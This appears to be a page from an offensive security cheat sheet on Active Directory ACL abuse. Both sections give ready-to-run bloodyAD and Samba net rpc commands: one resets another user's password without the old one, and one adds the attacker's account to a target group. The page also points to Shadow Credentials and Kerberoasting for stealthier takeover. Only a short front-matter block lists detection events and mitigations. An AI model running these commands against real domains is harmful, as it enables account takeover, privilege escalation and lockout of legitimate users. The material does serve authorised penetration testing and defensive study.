---
title: ForceChangePassword / AddMember
category: AD / ACL abuse
order: 40
tags: [forcechangepassword, addmember, addself, bloodyad, net-rpc]
summary: >
  ForceChangePassword resets a user's password without knowing the old one.
  AddMember / AddSelf adds you to a group. Both are one-liners over LDAP/SAMR.
prerequisites:
  - ForceChangePassword (User-Force-Change-Password) or AddMember/AddSelf over the target
  - LDAP/SMB reach to a DC ($dc_ip / $dc_host)
tools: [bloodyAD, net (Samba), rpcclient, PowerView]
detection:
  - Password reset (4724/4738) not from helpdesk; group membership change (4728/4732/4756)
mitigation:
  - Remove the ACE; monitor resets and privileged group changes
refs:
  - { label: "The Hacker Recipes — DACL", url: "https://www.thehacker.recipes/ad/movement/dacl" }
---

## ForceChangePassword (reset without old password)

```sh
bloodyAD -u $user -p $password -d $domain --host $dc_ip set password $target_user 'NewPass123!'
# Samba net rpc
net rpc password "$target_user" 'NewPass123!' -U "$domain_nb"/"$user"%"$password" -S $dc_host
```

> A reset is **loud and disruptive** — it locks the real user out and can break a
> service account. On a live account prefer **Shadow Credentials** or **targeted
> Kerberoast** instead; only reset when you can restore the password afterwards.

## AddMember / AddSelf (join a group)

```sh
bloodyAD -u $user -p $password -d $domain --host $dc_ip add groupMember "Target Group" $user
net rpc group addmem "Target Group" "$user" -U "$domain_nb"/"$user"%"$password" -S $dc_host
```

> If the group is nested into a privileged one (e.g. a group that's a member of a
> group that has admin rights), membership still grants the effective access —
> follow the BloodHound path, not just the direct group.
